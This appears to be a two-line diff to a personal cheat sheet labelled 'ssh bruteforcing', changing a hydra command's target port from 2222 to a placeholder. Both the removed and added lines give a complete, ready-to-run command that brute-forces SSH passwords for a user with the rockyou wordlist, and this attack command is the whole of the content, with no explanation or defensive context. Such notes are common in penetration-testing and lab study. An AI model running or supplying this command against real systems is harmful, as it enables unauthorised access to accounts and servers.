@@ -1,2 +1,2 @@
 ssh bruteforcing:
-hydra -l user -P /usr/share/wordlists/rockyou.txt ssh://ip:2222 -t 4
+hydra -l user -P /usr/share/wordlists/rockyou.txt ssh://ip:port -t 4
